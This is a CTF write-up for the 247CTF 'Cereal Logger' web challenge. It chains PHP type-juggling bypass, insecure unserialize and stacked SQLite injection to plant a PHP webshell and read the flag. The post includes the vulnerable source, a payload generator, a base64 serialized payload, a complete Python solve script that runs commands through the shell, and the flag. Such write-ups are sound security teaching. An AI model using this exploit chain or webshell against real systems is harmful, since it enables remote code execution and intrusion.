---
title: "CEREAL LOGGER"
date: 2026-02-11
summary: "247ctf hard web chall"
tags: ["247ctf", "ctf", "web", "type juggling", "unserialize", "sqli", "webshell"]
---

<img src="/blog/247ctf_cereal_logger_writeup/images/chall.png" width=600>

### Vulnerability Analysis  

Looking at the challenge source, we can immediately notice quite a few vulnerabilities.  

First, the cookie verification uses a loose comparison `==` against `0`, and this can potentially be bypassed with PHP type juggling.  

Next, after the cookie is verified, the server unserializes it, and PHP `unserialize` has been known to be exploitable, especially if there are pre-existing classes with vulnerable methods.  

The class in question is the `insert_log` class being implemented, with a `__destruct()` method that logs a generic message into a database. The method uses `exec()` which allows stacked queries, and the server blindly interpolates the `$new_data` attribute to the query, giving us an SQLi vector.  

```php
<?php

  class insert_log
  {
      public $new_data = "Valid access logged!";
      public function __destruct()
      {
          $this->pdo = new SQLite3("/tmp/log.db");
          $this->pdo->exec("INSERT INTO log (message) VALUES ('".$this->new_data."');");
      }
  }

  if (isset($_COOKIE["247"]) && explode(".", $_COOKIE["247"])[1].rand(0, 247247247) == "0") {
      file_put_contents("/dev/null", unserialize(base64_decode(explode(".", $_COOKIE["247"])[0])));
  } else {
      echo highlight_file(__FILE__, true);
  }

?>
```

Putting it all together, we must craft a cookie that will deserialize to an `insert_log` object, with the `$new_data` attribute set to a SQLi payload that will upload a PHP webshell, giving us RCE.  

### Exploit  

The cookie is handled in two ways. The server splits it by the delimited `.`, then appends the random number to the second part. The first part will then be deserialized when this check passes.  

To bypass the `rand()` check, we can just set the second part of our cookie to `0e`, and PHP type juggling will evaluate the concatenated result with `rand()` as `0`, passing the check.  

```
Cookie: <payload>.0e
```

For the main body of our cookie, we will use a specially crafted `insert_log` object as our payload.  

When `$new_data` is injected into the query, it will create a database file called `shell.php` and insert the webshell payload into the file.  

The server will parse it as a PHP file, so when we access it in the index page, the server will execute our webshell normally, giving us RCE.  

```php
<?php

  class insert_log
  {
      public $new_data = "Valid access logged!";
  }

  $payload = new insert_log();
  $payload->new_data = "'); ATTACH DATABASE '/var/www/html/shell.php' AS pwn; CREATE TABLE pwn.payload (data text); INSERT INTO pwn.payload (data) VALUES ('<?php system(\$_GET[\"cmd\"]); ?>";

  echo base64_encode(serialize($payload));

?>
```

When we visit the page with our cookie, after the request ends, the `__destruct()` method will be automatically invoked, triggering our SQLi payload.  

```python
payload = 'TzoxMDoiaW5zZXJ0X2xvZyI6MTp7czo4OiJuZXdfZGF0YSI7czoxNjI6IicpOyBBVFRBQ0ggREFUQUJBU0UgJy92YXIvd3d3L2h0bWwvc2hlbGwucGhwJyBBUyBwd247IENSRUFURSBUQUJMRSBwd24ucGF5bG9hZCAoZGF0YSB0ZXh0KTsgSU5TRVJUIElOVE8gcHduLnBheWxvYWQgKGRhdGEpIFZBTFVFUyAoJzw/cGhwIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/PiI7fQ=='

res = requests.get(url, cookies={
    '247': f'{payload}.0e'
})
```

Inside the webshell, we won't find a flag file anywhere, but running `strings` on the main database `/tmp/log.db` will reveal the flag stored as a record inside.  

<img src="/blog/247ctf_cereal_logger_writeup/images/flag.png" width=600>

Below is my solve script for this challenge.  

```python
import requests
import re

url = "https://60e8f4425247bf5f.247ctf.com/"

# php deserialize bug
payload = 'TzoxMDoiaW5zZXJ0X2xvZyI6MTp7czo4OiJuZXdfZGF0YSI7czoxNjI6IicpOyBBVFRBQ0ggREFUQUJBU0UgJy92YXIvd3d3L2h0bWwvc2hlbGwucGhwJyBBUyBwd247IENSRUFURSBUQUJMRSBwd24ucGF5bG9hZCAoZGF0YSB0ZXh0KTsgSU5TRVJUIElOVE8gcHduLnBheWxvYWQgKGRhdGEpIFZBTFVFUyAoJzw/cGhwIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/PiI7fQ=='

res = requests.get(url, cookies={
    '247': f'{payload}.0e'
})

print("> Webshell uploaded")

# rce
cmd = "strings /tmp/log.db"

res = requests.get(f"{url}/shell.php?cmd={cmd}")

flag = re.findall(r'(247CTF{.+})', res.text)[0]
print("Flag:", flag)
```

Flag: `247CTF{7f1e0c328fca8d50781db753f2a95725}`